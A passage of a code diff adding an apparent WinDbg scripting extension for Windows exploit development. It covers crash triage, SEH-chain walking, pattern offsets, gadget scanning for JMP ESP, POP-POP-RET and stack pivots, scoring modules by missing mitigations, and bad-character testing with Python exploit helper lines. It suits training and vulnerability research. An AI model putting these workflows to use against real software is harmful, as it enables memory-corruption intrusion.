+      const message = error2 instanceof Error ? error2.message : String(error2);
+      return {
+        records,
+        warning: `Could not read the SEH chain head at 0x${teb.toString(16).toUpperCase()}: ${message}`,
+        stoppedAtGuard: false
+      };
+    }
+    while (node !== __bi(4294967295) && records.length < maxRecords) {
+      try {
+        const next = reader(node, 4);
+        const handler = reader(node + __bi(4), 4);
+        records.push({ node, next, handler });
+        node = next;
+      } catch (error2) {
+        const message = error2 instanceof Error ? error2.message : String(error2);
+        return {
+          records,
+          warning: `SEH walk stopped at unreadable record 0x${node.toString(16).toUpperCase()}: ${message}`,
+          stoppedAtGuard: false
+        };
+      }
+    }
+    return {
+      records,
+      stoppedAtGuard: node !== __bi(4294967295)
+    };
+  }
+  function readSehRecords(teb, maxRecords = 64, reader = readPointer) {
+    return walkSehRecords(teb, maxRecords, reader).records;
+  }
+
+  // src/core/exploit_strategy_advisor.ts
+  function adviseExploitStrategy(evidence) {
+    var _a;
+    const recommendations = [];
+    const stale = [evidence.instructionPointerControlled, evidence.stackControlled, evidence.landingRegionExecutable, evidence.depEnabled, evidence.aslrEnabled].some((item) => item.targetId !== void 0 && evidence.currentTargetId !== void 0 && item.targetId !== evidence.currentTargetId);
+    if (stale) {
+      return [{
+        strategy: "Refresh exploitation evidence",
+        rationale: "Evidence belongs to a different target instance and must not guide this assessment.",
+        confidence: "unknown",
+        nextCommands: ["triage"]
+      }];
+    }
+    if (evidence.instructionPointerControlled.value !== true) {
+      recommendations.push({
+        strategy: evidence.instructionPointerControlled.value === false ? "Establish instruction-pointer control" : "Inspect crash control evidence",
+        rationale: evidence.instructionPointerControlled.value === false ? "Observed evidence does not demonstrate instruction-pointer control." : "Instruction-pointer control is unknown.",
+        confidence: evidence.instructionPointerControlled.value === false ? "observed" : "unknown",
+        nextCommands: ["triage", "findmsp", "landing"]
+      });
+      return recommendations;
+    }
+    if (evidence.landingRegionExecutable.value === true) {
+      recommendations.push({
+        strategy: "Investigate direct execution",
+        rationale: "The intended landing region is observed executable; control-flow reachability remains unverified.",
+        confidence: "inferred",
+        nextCommands: ["landing", "badchars", "find_ptr"]
+      });
+    } else if (evidence.landingRegionExecutable.value === false) {
+      if (((_a = evidence.executableAlternativeAvailable) == null ? void 0 : _a.value) === true) {
+        recommendations.push({
+          strategy: "Evaluate an executable landing alternative",
+          rationale: "The current landing region is observed non-executable, while an executable alternative was observed.",
+          confidence: "inferred",
+          nextCommands: ["landing", "code_caves", "find_ptr"]
+        });
+      } else {
+        recommendations.push({
+          strategy: "Investigate executable landing regions",
+          rationale: "The current landing region is observed non-executable; direct execution there would violate its protection.",
+          confidence: "observed",
+          nextCommands: ["code_caves"]
+        });
+        recommendations.push({
+          strategy: "Evaluate protection-changing techniques",
+          rationale: "A DEP bypass may be relevant only if no viable executable landing region is established.",
+          confidence: "inferred",
+          nextCommands: ["rop.scan_live", "rop.capabilities"]
+        });
+      }
+    } else {
+      recommendations.push({
+        strategy: "Inspect landing memory protection",
+        rationale: "The execution permission of the intended landing region is unknown.",
+        confidence: "unknown",
+        nextCommands: ["memory", "landing"]
+      });
+    }
+    if (evidence.aslrEnabled.value === true) {
+      recommendations.push({
+        strategy: "Validate address stability",
+        rationale: "ASLR is observed enabled; usable target addresses require module-mapping evidence.",
+        confidence: "observed",
+        nextCommands: ["modules", "sc.modules"]
+      });
+    }
+    if (evidence.corpusStatus === "inactive" || evidence.corpusStatus === "absent") {
+      recommendations.push({
+        strategy: "Treat ROP capability as unestablished",
+        rationale: evidence.corpusStatus === "inactive" ? "The imported corpus is inactive until validation against the live target succeeds." : "No active gadget corpus has been observed.",
+        confidence: "observed",
+        nextCommands: evidence.corpusStatus === "inactive" ? ["rop.corpus.validate"] : ["rop.scan_live"]
+      });
+    }
+    return recommendations;
+  }
+
+  // src/commands/triage.ts
+  function safeGet2(value, key2) {
+    if (!value || typeof value !== "object") {
+      return void 0;
+    }
+    try {
+      return value[key2];
+    } catch (_error) {
+      return void 0;
+    }
+  }
+  function safeKeys2(value) {
+    if (!value || typeof value !== "object") {
+      return [];
+    }
+    try {
+      return Object.keys(value);
+    } catch (_error) {
+      return [];
+    }
+  }
+  function toBigInt3(value) {
+    if (typeof value === "bigint") {
+      return value;
+    }
+    if (typeof value === "number" && Number.isFinite(value) && value >= 0) {
+      return __bi(Math.trunc(value));
+    }
+    if (typeof value === "string") {
+      const text = value.trim();
+      if (/^0x[0-9a-fA-F]+$/.test(text)) {
+        return __bi(text);
+      }
+      if (/^[0-9a-fA-F]+$/.test(text)) {
+        return __bi(`0x${text}`);
+      }
+      if (/^[0-9]+$/.test(text)) {
+        return __bi(text);
+      }
+    }
+    if (value && typeof value === "object") {
+      const nested = ["value", "Value", "address", "Address", "targetLocation"];
+      for (const key2 of nested) {
+        const parsed = toBigInt3(safeGet2(value, key2));
+        if (parsed !== void 0) {
+          return parsed;
+        }
+      }
+      try {
+        const valueOf = safeGet2(value, "valueOf");
+        if (typeof valueOf === "function") {
+          const resolved = valueOf.call(value);
+          if (resolved !== value) {
+            const parsed = toBigInt3(resolved);
+            if (parsed !== void 0) {
+              return parsed;
+            }
+          }
+        }
+      } catch (_error) {
+      }
+      try {
+        const asString = safeGet2(value, "toString");
+        if (typeof asString === "function") {
+          const str = asString.call(value);
+          if (typeof str === "string" && str !== "[object Object]") {
+            return toBigInt3(str);
+          }
+        }
+      } catch (_error) {
+      }
+    }
+    return void 0;
+  }
+  function readRegisters(pointerSize) {
+    var _a;
+    const thread = host.currentThread;
+    const regsRoot = safeGet2(thread, "Registers");
+    const userRegs = (_a = safeGet2(regsRoot, "User")) != null ? _a : regsRoot;
+    const all = [];
+    for (const key2 of safeKeys2(userRegs)) {
+      const parsed = toBigInt3(safeGet2(userRegs, key2));
+      if (parsed !== void 0) {
+        all.push({ name: key2, value: parsed });
+      }
+    }
+    const pick2 = (...names) => {
+      for (const candidate of names) {
+        const found = all.find((entry) => entry.name.toLowerCase() === candidate.toLowerCase());
+        if (found) {
+          return found;
+        }
+      }
+      return void 0;
+    };
+    const ip = pointerSize === 8 ? pick2("rip", "eip") : pick2("eip", "rip");
+    const sp = pointerSize === 8 ? pick2("rsp", "esp") : pick2("esp", "rsp");
+    const ex = pick2("exceptioncode", "exception", "lastExceptionCode");
+    return {
+      ip: ip == null ? void 0 : ip.value,
+      ipName: ip == null ? void 0 : ip.name,
+      sp: sp == null ? void 0 : sp.value,
+      spName: sp == null ? void 0 : sp.name,
+      exceptionCode: ex == null ? void 0 : ex.value,
+      all
+    };
+  }
+  function findOffset(raw, maxLen) {
+    if (raw === void 0) {
+      return void 0;
+    }
+    const low = Number(__bi.and(raw, __bi(4294967295)));
+    const candidates2 = [
+      { kind: "msf", haystack: generateMsfPattern(Math.min(maxLen, 20280)) },
+      { kind: "cyclic", haystack: generateCyclicPattern(Math.max(maxLen, 2e4)) }
+    ];
+    for (const candidate of candidates2) {
+      const needle = decodeOffsetNeedle(low);
+      const offset = candidate.haystack.indexOf(needle);
+      if (offset >= 0) {
+        return { kind: candidate.kind, offset };
+      }
+    }
+    return void 0;
+  }
+  function isInstructionPointerControlled(evidence) {
+    if (evidence.patternMatched) {
+      return true;
+    }
+    if (evidence.ip === void 0) {
+      return false;
+    }
+    if (evidence.exceptionCode === __bi(3221225477)) {
+      return true;
+    }
+    return evidence.ipBackedByModule === false;
+  }
+  function landingCandidateAddresses(evidence) {
+    const candidateKinds = /* @__PURE__ */ new Set(["nop_sled_detected", "payload_like_bytes"]);
+    const addresses = evidence.observations.filter((item) => candidateKinds.has(item.kind) && item.address !== void 0).map((item) => item.address);
+    return [...new Set(addresses.map(String))].map(__bi).sort((a, b) => a < b ? -1 : a > b ? 1 : 0).slice(0, 5);
+  }
+  function scoreModule(module) {
+    let score = 0;
+    if (!module.system)
+      score += 25;
+    if (module.aslr === "disabled")
+      score += 35;
+    if (module.nxcompat === "disabled")
+      score += 10;
+    if (module.safeseh === "disabled")
+      score += 30;
+    return score;
+  }
+  function moduleLabel(name) {
+    var _a;
+    return (_a = name.split(/[\\/]/).filter(Boolean).pop()) != null ? _a : name;
+  }
+  var TRIAGE_ASLR_TAIL_LIMIT = 6;
+  function selectTriageModules(scored) {
+    const ranked = [...scored].sort((a, b) => b.score - a.score);
+    return [
+      ...ranked.filter((item) => item.aslr === "disabled"),
+      ...ranked.filter((item) => item.aslr !== "disabled").slice(0, TRIAGE_ASLR_TAIL_LIMIT)
+    ];
+  }
+  function scanGadgets(pointerSize, moduleFilter) {
+    const fmt = (address) => {
+      const mod = findModuleByAddress(address);
+      if (!mod) {
+        return formatAddress(address, getPointerSize());
+      }
+      const delta = address - mod.base;
+      return `${moduleLabel(mod.name)}+0x${delta.toString(16).toUpperCase()}`;
+    };
+    const jmpHits = scanPattern({ module: moduleFilter, executableOnly: true, maxResults: 12, chunkSize: 16384 }, Uint8Array.from([255, 228])).hits;
+    const callHits = scanPattern({ module: moduleFilter, executableOnly: true, maxResults: 12, chunkSize: 16384 }, Uint8Array.from([255, 212])).hits;
+    const pprHits = [];
+    if (pointerSize === 4) {
+      for (let a = 88; a <= 95 && pprHits.length < 12; a += 1) {
+        for (let b = 88; b <= 95 && pprHits.length < 12; b += 1) {
+          const hits = scanPattern({ module: moduleFilter, executableOnly: true, maxResults: Math.max(0, 12 - pprHits.length), chunkSize: 16384 }, Uint8Array.from([a, b, 195])).hits;
+          pprHits.push(...hits);
+        }
+      }
+    }
+    const pivotPatterns = pointerSize === 8 ? [
+      Uint8Array.from([72, 148, 195]),
+      Uint8Array.from([84, 195]),
+      Uint8Array.from([72, 137, 236, 195]),
+      Uint8Array.from([72, 137, 196, 195])
+    ] : [Uint8Array.from([148, 195]), Uint8Array.from([84, 195]), Uint8Array.from([139, 229, 195])];
+    const pivotHits = [];
+    for (const pattern of pivotPatterns) {
+      const hits = scanPattern({ module: moduleFilter, executableOnly: true, maxResults: Math.max(0, 12 - pivotHits.length), chunkSize: 16384 }, pattern).hits;
+      pivotHits.push(...hits);
+      if (pivotHits.length >= 12) {
+        break;
+      }
+    }
+    const uniq = (values) => [...new Set(values.map((v) => v.toString()))].map((v) => __bi(v)).sort((left, right) => {
+      const rank = (address) => {
+        var _a;
+        return ((_a = findModuleByAddress(address)) == null ? void 0 : _a.aslr) === "disabled" ? 0 : 1;
+      };
+      return rank(left) - rank(right) || (left < right ? -1 : left > right ? 1 : 0);
+    });
+    return {
+      jmp: uniq(jmpHits).slice(0, 5).map(fmt),
+      call: uniq(callHits).slice(0, 5).map(fmt),
+      ppr: uniq(pprHits).slice(0, 5).map(fmt),
+      pivots: uniq(pivotHits).slice(0, 5).map(fmt)
+    };
+  }
+  function readSehPreview(pointerSize) {
+    if (pointerSize !== 4) {
+      return { overwritten: "unknown", warning: "SEH overwrite analysis is x86-only." };
+    }
+    const tebCandidate = resolveTeb32Address(host.currentThread);
+    if (!tebCandidate) {
+      return { overwritten: "unknown", warning: "TEB unavailable for SEH walk." };
+    }
+    try {
+      const first = readSehRecords(tebCandidate, 1)[0];
+      if (!first) {
+        return { overwritten: "no", warning: "SEH chain is empty." };
+      }
+      const { next, handler } = first;
+      const mod = findModuleByAddress(handler);
+      const overwritten = mod ? "no" : "yes";
+      return { overwritten, next, handler };
+    } catch (error2) {
+      const msg = error2 instanceof Error ? error2.message : String(error2);
+      return { overwritten: "unknown", warning: `SEH read failed: ${msg}` };
+    }
+  }
+  function quickBadcharScan(bytes, badchars) {
+    if (!bytes) {
+      return [];
+    }
+    return badchars.map((byte) => {
+      let count = 0;
+      let first;
+      for (let i = 0; i < bytes.length; i += 1) {
+        if (bytes[i] === byte) {
+          count += 1;
+          if (first === void 0) {
+            first = i;
+          }
+        }
+      }
+      return { byte, count, first };
+    });
+  }
+  function strategyEvidence(value, source) {
+    return { value, source, observedAt: Date.now() };
+  }
+  function renderStrategyAssessment(pointerSize, ipControlled, landingEvidence, stackExecutable, depEnforced, modules, patternOffset) {
+    var _a;
+    const evidence = {
+      instructionPointerControlled: strategyEvidence(ipControlled, ipControlled ? "pattern match or crash state" : "crash state"),
+      stackControlled: strategyEvidence(landingEvidence.observations.some((item) => item.kind === "cyclic_pattern_match"), "landing analysis"),
+      landingRegionExecutable: strategyEvidence(stackExecutable, ((_a = landingEvidence.memory) == null ? void 0 : _a.source) === "vprot" ? "VirtualQuery" : "memory protection unavailable"),
+      depEnabled: strategyEvidence(depEnforced, depEnforced === null ? "unknown" : "stack protection observation"),
+      aslrEnabled: strategyEvidence(null, "not assessed by triage strategy snapshot"),
+      executableAlternativeAvailable: strategyEvidence(null, "not scanned by triage"),
+      corpusStatus: "unknown"
+    };
+    const recommendations = adviseExploitStrategy(evidence);
+    section("EXPLOIT STRATEGY");
+    const controlSource = patternOffset ? `${patternOffset.kind.toUpperCase()} pattern, offset ${patternOffset.offset}` : evidence.instructionPointerControlled.source;
+    print(`CONTROL: ${ipControlled ? pointerSize === 8 ? "RIP controlled" : "EIP controlled" : "not demonstrated"} [${controlSource}]`);
+    if (landingEvidence.address !== void 0)
+      print(`Landing: ${formatAddress(landingEvidence.address, pointerSize)}`);
+    print(`Access: ${stackExecutable === true ? "executable" : stackExecutable === false ? "non-executable" : "unknown"} [${evidence.landingRegionExecutable.source}]`);
+    const primary = recommendations[0];
+    print(`Assessment: ${primary.rationale}`);
+    const stableModules = modules.filter((module) => module.aslr === "disabled" && !module.system);
+    print("ROP SOURCES:");
+    print(`  Non-ASLR application modules: ${stableModules.length}`);
+    print("  Gadget corpus: not evaluated");
+    print("  ROP feasibility: unknown");
+    const next = [...new Set(recommendations.flatMap((item) => item.nextCommands))].slice(0, 3);
+    if (next.length > 0) {
+      print("NEXT:");
+      for (const command2 of next) {
+        const invocation = command2 === "memory" && landingEvidence.address !== void 0 ? `memory(${formatAddress(landingEvidence.address, pointerSize)})` : `${command2}()`;
+        print(`  dx @$osed().${invocation}`);
+      }
+    }
+    return { evidence, recommendations };
+  }
+  function createTriageCommand() {
+    return {
+      name: "triage",
+      description: "Fast crash triage for exploit-development workflows. The MODULE SCORE table lists every attacker-controlled (ASLR-disabled) module, since those tie at the top score and are all equally worth using; only the ASLR-enabled tail is capped so hardened targets stay bounded.",
+      usage: "dx @$osed().triage(patternLength?, badchars?, module?, stackBytes?)",
+      examples: ["dx @$osed().triage()", 'dx @$osed().triage(10000, "00 0A 0D", "vulnserver")'],
+      schema: {
+        patternLength: { type: "number", min: 256, max: 1e5, default: 1e4 },
+        badchars: { type: "array", elementType: "number", default: [0, 10, 13] },
+        module: { type: "string" },
+        stackBytes: { type: "number", min: 128, max: 4096, default: 1024 }
+      },
+      execute(options) {
+        var _a, _b, _c, _d, _e, _f, _g, _h;
+        const pointerSize = getPointerSize();
+        const regs = readRegisters(pointerSize);
+        const patternLength = options.patternLength;
+        const stackBytesToRead = options.stackBytes;
+        const badchars = ((_a = options.badchars) != null ? _a : [0, 10, 13]).map((v) => v & 255);
+        const moduleFilter = options.module;
+        const patternOffset = findOffset(regs.ip, patternLength);
+        const seh = readSehPreview(pointerSize);
+        const landingEvidence = landing(regs.sp, stackBytesToRead);
+        const stackBytes = landingEvidence.bytes.length > 0 ? Uint8Array.from(landingEvidence.bytes) : void 0;
+        const shellcode = landingCandidateAddresses(landingEvidence);
+        const badcharStats = quickBadcharScan(stackBytes, badchars);
+        const modules = selectTriageModules(listModulesWithMitigations(moduleFilter).map((module) => ({
+          module: module.name,
+          score: scoreModule(module),
+          aslr: module.aslr,
+          nxcompat: module.nxcompat,
+          safeseh: module.safeseh,
+          system: module.system
+        })));
+        const gadgets = scanGadgets(pointerSize, moduleFilter);
+        const ipBackedByModule = regs.ip !== void 0 ? findModuleByAddress(regs.ip) !== void 0 : void 0;
+        const eipControlled = isInstructionPointerControlled({
+          patternMatched: patternOffset !== void 0,
+          ip: regs.ip,
+          ipBackedByModule,
+          exceptionCode: regs.exceptionCode
+        }) ? "yes" : "no";
+        const badSp = stackBytes ? "no" : "yes";
+        const stackProt = regs.sp !== void 0 ? queryStackProtection(regs.sp, pointerSize) : void 0;
+        section("CONTROL");
+        print(`${pointerSize === 8 ? "RIP" : "EIP"} controlled: ${eipControlled}`);
+        print(`Offset: ${patternOffset ? patternOffset.offset : "n/a"}`);
+        print(`Pattern: ${patternOffset ? patternOffset.kind : "n/a"}`);
+        section("SEH");
+        if (pointerSize === 8) {
+          print("Not applicable: classic SEH overwrite workflow is x86-only.");
+        } else {
+          print(`Overwritten: ${seh.overwritten}`);
+          print(`Next SEH: ${seh.next !== void 0 ? formatAddress(seh.next, 4) : "n/a"}`);
+          print(`Handler: ${seh.handler !== void 0 ? formatAddress(seh.handler, 4) : "n/a"}`);
+          if (seh.warning)
+            print(`Status: ${seh.warning}`);
+        }
+        section("STACK");
+        print(`${(_b = regs.spName) != null ? _b : "SP"}: ${regs.sp !== void 0 ? formatAddress(regs.sp, pointerSize) : "n/a"}`);
+        print(`Bad stack pointer: ${badSp}`);
+        const stackPattern = landingEvidence.patternEvidence;
+        print(`SP pattern observation: ${(stackPattern == null ? void 0 : stackPattern.matched) ? `${(_c = stackPattern.patternFamily) == null ? void 0 : _c.toUpperCase()} (${stackPattern.matchLength} sampled bytes)` : stackBytes ? "none" : "unknown"}`);
+        if (stackProt) {
+          print(`Stack protect: ${stackProt.name}`);
+          print(`DEP enforced: ${stackProt.depEnforced ? "yes" : "no"}`);
+        } else {
+          print("Stack protect: unknown");
+          print("DEP enforced: unknown");
+        }
+        if (shellcode.length > 0) {
+          print("Shellcode candidates:");
+          for (const candidate of shellcode) {
+            print(`  ${formatAddress(candidate, pointerSize)}`);
+          }
+        } else {
+          print("Shellcode candidates: none");
+        }
+        section("GADGETS");
+        print(pointerSize === 8 ? "JMP RSP:" : "JMP ESP:");
+        for (const line of gadgets.jmp)
+          print(`  ${line}`);
+        print(pointerSize === 8 ? "CALL RSP:" : "CALL ESP:");
+        for (const line of gadgets.call)
+          print(`  ${line}`);
+        if (pointerSize === 4) {
+          print("POP POP RET:");
+          for (const line of gadgets.ppr)
+            print(`  ${line}`);
+        }
+        print("Stack pivots:");
+        for (const line of gadgets.pivots)
+          print(`  ${line}`);
+        section("CONTEXT");
+        print(`Exception code: ${regs.exceptionCode !== void 0 ? formatAddress(regs.exceptionCode, 4) : "n/a"}`);
+        print(`${(_d = regs.ipName) != null ? _d : "IP"}: ${regs.ip !== void 0 ? formatAddress(regs.ip, pointerSize) : "n/a"}`);
+        section("MODULE SCORE");
+        table([
+          { key: "module", header: "Module", width: 20 },
+          { key: "score", header: "Score", width: 5 },
+          { key: "aslr", header: "ASLR", width: 4 },
+          { key: "nxcompat", header: "NX", width: 3 },
+          { key: "safeseh", header: "SafeSEH", width: 8 }
+        ], modules.map((item) => ({
+          module: moduleLabel(item.module),
+          score: `${item.score}`,
+          aslr: item.aslr === "disabled" ? "Off" : item.aslr === "enabled" ? "On" : "?",
+          nxcompat: item.nxcompat === "disabled" ? "Off" : item.nxcompat === "enabled" ? "On" : "?",
+          safeseh: item.safeseh === "disabled" ? "Off" : item.safeseh === "enabled" ? "On" : "?"
+        })));
+        section("BYTE OBSERVATIONS");
+        table([
+          { key: "byte", header: "Byte", width: 8 },
+          { key: "count", header: "Occurrences", width: 11 },
+          { key: "first", header: "FirstOff", width: 8 }
+        ], badcharStats.map((entry) => ({
+          byte: formatHexByte(entry.byte),
+          count: `${entry.count}`,
+          first: entry.first !== void 0 ? `${entry.first}` : "n/a"
+        })));
+        print("No bad characters confirmed by this scan; compare transmitted and received bytes.");
+        const warnings = [];
+        warnings.push(...(_f = (_e = landingEvidence.memory) == null ? void 0 : _e.warnings) != null ? _f : []);
+        if (landingEvidence.address === void 0)
+          warnings.push(landingEvidence.recommendation);
+        else if (landingEvidence.observations.some((item) => item.kind === "bytes_inaccessible"))
+          warnings.push("Stack read failed: landing bytes are inaccessible.");
+        else if (landingEvidence.observations.some((item) => item.kind === "bytes_truncated"))
+          warnings.push("Stack read was truncated before the requested length.");
+        if (seh.warning)
+          warnings.push(seh.warning);
+        const strategy = renderStrategyAssessment(pointerSize, eipControlled === "yes", landingEvidence, (_g = stackProt == null ? void 0 : stackProt.executable) != null ? _g : null, (_h = stackProt == null ? void 0 : stackProt.depEnforced) != null ? _h : null, modules, patternOffset);
+        const findings = [
+          {
+            control: {
+              ipControlled: eipControlled === "yes",
+              offset: patternOffset == null ? void 0 : patternOffset.offset,
+              pattern: patternOffset == null ? void 0 : patternOffset.kind,
+              ip: regs.ip,
+              ipName: regs.ipName
+            },
+            seh,
+            stack: {
+              sp: regs.sp,
+              spName: regs.spName,
+              badPointer: badSp === "yes",
+              shellcodeCandidates: shellcode,
+              landing: landingEvidence,
+              stackExecutable: stackProt ? stackProt.executable : void 0
+            },
+            gadgets,
+            modules,
+            badchars: badcharStats,
+            exception: regs.exceptionCode,
+            strategy
+          }
+        ];
+        return {
+          command: "triage",
+          args: options,
+          success: true,
+          findings,
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/badchars.ts
+  function result(command2, args, findings, warnings = []) {
+    return { command: command2, args, success: true, findings, warnings, errors: [] };
+  }
+  function readLargestWindow(start, maxLength) {
+    let low = 1;
+    let high = maxLength;
+    let best;
+    while (low <= high) {
+      const mid = low + Math.floor((high - low) / 2);
+      const chunk = tryReadMemory(start, mid);
+      if (chunk) {
+        best = chunk;
+        low = mid + 1;
+      } else {
+        high = mid - 1;
+      }
+    }
+    return best;
+  }
+  var RETURN_SLOT_REACH = 64;
+  var CONTENT_BACKTRACK = 8;
+  function readAfterReturnSlot(anchor, pointerSize, length) {
+    var _a;
+    const ip = readRegisters(pointerSize).ip;
+    if (ip === void 0 || findModuleByAddress(ip) !== void 0)
+      return void 0;
+    const reach = RETURN_SLOT_REACH + pointerSize;
+    const start = anchor - __bi(reach);
+    const before = tryReadMemory(start, reach);
+    if (!before)
+      return void 0;
+    const offset = findReturnSlot(before, ip, pointerSize);
+    if (offset === void 0)
+      return void 0;
+    const slot = start + __bi(offset);
+    const landing2 = slot + __bi(pointerSize);
+    const observed = (_a = tryReadMemory(landing2, length)) != null ? _a : readLargestWindow(landing2, length);
+    return observed ? { slot, landing: landing2, observed } : void 0;
+  }
+  function createBadcharsCommand() {
+    return {
+      name: "badchars",
+      description: "Identify bad characters from a memory byte sequence.",
+      usage: "dx @$osed().badchars(address, exclude?)",
+      examples: [
+        "dx @$osed().badchars(0x00B8F900)",
+        'dx @$osed().badchars("00B8F900", "00 0A 0D")'
+      ],
+      schema: {
+        address: { type: ["number", "string"], required: true },
+        exclude: { type: "array", elementType: "number", default: [] }
+      },
+      execute(options) {
+        var _a;
+        const address = normalizeAddress(options.address);
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : []);
+        const expected = expectedBytes(normalizedExclude.values);
+        const observed = readMemory(address, expected.length + 64);
+        const compared = compareBadchars(observed, expected);
+        const pointerSize = getPointerSize();
+        section("Bad Character Analysis");
+        info(`Start address: ${formatAddress(address, pointerSize)}`);
+        if (normalizedExclude.values.length > 0) {
+          info(`Known excludes: ${normalizedExclude.values.map((v) => formatHexByte(v)).join(" ")}`);
+        }
+        if (compared.badChars.length > 0) {
+          warn(`Bad characters found: ${compared.badChars.map((v) => formatHexByte(v)).join(" ")}`);
+        } else if (compared.expectedConsumed >= expected.length) {
+          info("All expected bytes survived \u2014 no bad characters detected.");
+        } else {
+          info("No bad characters detected in the tested range.");
+        }
+        info(`Survivors: ${compared.survivorCount} of ${compared.expectedConsumed} tested bytes`);
+        if (compared.expectedConsumed < expected.length) {
+          const lastTested = expected[compared.expectedConsumed - 1];
+          const firstUntested = expected[compared.expectedConsumed];
+          warn(`Array truncated after ${formatHexByte(lastTested)}; bytes ${formatHexByte(firstUntested)}-0xFF not tested.`);
+          if (compared.truncatedAt !== void 0) {
+            warn(`Likely terminator: ${formatHexByte(compared.truncatedAt)} (first byte that never arrived).`);
+          }
+        }
+        const allExclude = [.../* @__PURE__ */ new Set([...normalizedExclude.values, ...compared.badChars])].sort((a, b) => a - b);
+        info(`Copy-ready exclude list: ${allExclude.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join(" ") || "(none)"}`);
+        const nextRun = compared.truncatedAt === void 0 ? allExclude : [...allExclude, compared.truncatedAt].sort((a, b) => a - b);
+        info(`Exploit line: ${pythonBadcharsLine(nextRun)}`);
+        info(`Next command: ${nextBadcharCommand("badchars", formatAddress(address, pointerSize), nextRun)}`);
+        whyItMatters("Accurate badchar profiling prevents payload corruption before shellcode staging.");
+        const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
+        return result("badchars", __spreadProps(__spreadValues({}, options), {
+          exclude: normalizedExclude.values
+        }), [
+          {
+            badChars: compared.badChars,
+            survivorCount: compared.survivorCount,
+            expectedConsumed: compared.expectedConsumed,
+            mismatches: compared.mismatches,
+            truncatedAt: compared.truncatedAt,
+            exclude: normalizedExclude.values,
+            allExclude
+          }
+        ], warnings);
+      }
+    };
+  }
+  function createBadcharArrayCommand() {
+    return {
+      name: "badchar_array",
+      description: "Generate a bad-character test byte array (0x00-0xFF minus excludes) in paste-ready forms.",
+      usage: "dx @$osed().badchar_array(exclude?)",
+      examples: ["dx @$osed().badchar_array()", 'dx @$osed().badchar_array("00 0A 0D")'],
+      schema: {
+        exclude: { type: "array", elementType: "number", default: [] }
+      },
+      execute(options) {
+        var _a;
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : []);
+        const expected = expectedBytes(normalizedExclude.values);
+        const python = formatByteArray(expected, "python");
+        const c = formatByteArray(expected, "c");
+        const hex4 = formatByteArray(expected, "hex");
+        section("Bad Character Test Array");
+        info(`Bytes: ${expected.length} (excluded ${normalizedExclude.values.length})`);
+        print(`Python: ${python}`);
+        print(`C:      ${c}`);
+        print(`Hex:    ${hex4}`);
+        whyItMatters("Send this array to the target, then use badchar_find to locate it in memory and see which bytes were mangled.");
+        const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
+        return result("badchar_array", __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }), [{ count: expected.length, exclude: normalizedExclude.values, bytes: expected, formats: { python, c, hex: hex4 } }], warnings);
+      }
+    };
+  }
+  function createBadcharFunctionCommand() {
+    return {
+      name: "badchar_function",
+      description: "Print a Python BADCHARS list plus a badchar_array() helper for the exploit, so each run only grows the list.",
+      usage: "dx @$osed().badchar_function(badchars?)",
+      examples: ['dx @$osed().badchar_function("00")', 'dx @$osed().badchar_function("00 0A 0D")'],
+      schema: {
+        exclude: { type: "array", elementType: "number", default: [] }
+      },
+      execute(options) {
+        var _a;
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : []);
+        const lines = pythonBadcharHelper(normalizedExclude.values);
+        section("Bad Character Python Helper");
+        for (const line of lines)
+          print(line);
+        print("");
+        print("payload += badchar_array()  # where the test array goes");
+        whyItMatters("Each badchar_find run prints the updated BADCHARS line; paste it over this one and send again.");
+        const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
+        return result("badchar_function", __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }), [{ exclude: normalizedExclude.values, lines }], warnings);
+      }
+    };
+  }
+  function createBadcharFindCommand() {
+    return {
+      name: "badchar_find",
+      description: "Locate a sent bad-character array in memory (near an address or the stack pointer) and report the first corrupted byte.",
+      usage: "dx @$osed().badchar_find(address?, exclude?, windowBytes?, minRun?)",
+      examples: ["dx @$osed().badchar_find()", 'dx @$osed().badchar_find("0012F800", "00 0A 0D")'],
+      schema: {
+        address: { type: ["number", "string"] },
+        exclude: { type: "array", elementType: "number", default: [] },
+        windowBytes: { type: "number", min: 256, max: 16384, default: 2048 },
+        minRun: { type: "number", min: 4, max: 64, default: 8 }
+      },
+      execute(options) {
+        var _a, _b;
+        const pointerSize = getPointerSize();
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : []);
+        const expected = expectedBytes(normalizedExclude.values);
+        const windowBytes = options.windowBytes;
+        const minRun = options.minRun;
+        let anchor;
+        let anchorLabel = "n/a";
+        if (options.address !== void 0) {
+          anchor = normalizeAddress(options.address);
+          anchorLabel = formatAddress(anchor, pointerSize);
+        } else {
+          const regs = readRegisters(pointerSize);
+          anchor = regs.sp;
+          anchorLabel = regs.sp !== void 0 ? `${(_b = regs.spName) != null ? _b : "sp"} ${formatAddress(regs.sp, pointerSize)}` : "n/a";
+        }
+        section("Bad Character Locate");
+        if (anchor === void 0) {
+          warn("No anchor address available (stack pointer unreadable). Provide an explicit address.");
+          return result("badchar_find", options, [{ located: false }], ["No anchor address available."]);
+        }
+        info(`Anchor: ${anchorLabel}`);
+        info(`Window: ${windowBytes} bytes, expecting a ${expected.length}-byte array.`);
+        let window = tryReadMemory(anchor, windowBytes);
+        const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
+        if (!window) {
+          window = readLargestWindow(anchor, windowBytes);
+          if (window) {
+            warnings.push(`Anchor range was only partially readable; scanned ${window.length} byte(s).`);
+          }
+        }
+        if (!window) {
+          warn("Anchor memory was not readable.");
+          return result("badchar_find", options, [{ located: false }], ["Anchor memory was not readable."]);
+        }
+        if (window.length < windowBytes) {
+          warn(`Anchor range was only partially readable; scanned ${window.length} byte(s).`);
+        }
+        const located = locateExpectedArray(window, expected, minRun);
+        let landing2;
+        let observed;
+        let locatedBy;
+        let slack = 0;
+        if (located) {
+          const back = located.expectedStart + CONTENT_BACKTRACK;
+          const runAddress = anchor + __bi(located.offset);
+          const backRead = tryReadMemory(runAddress - __bi(back), back + expected.length + 64);
+          landing2 = backRead ? runAddress - __bi(back) : runAddress;
+          observed = backRead != null ? backRead : window.slice(located.offset);
+          slack = backRead ? back : 0;
+          locatedBy = "content";
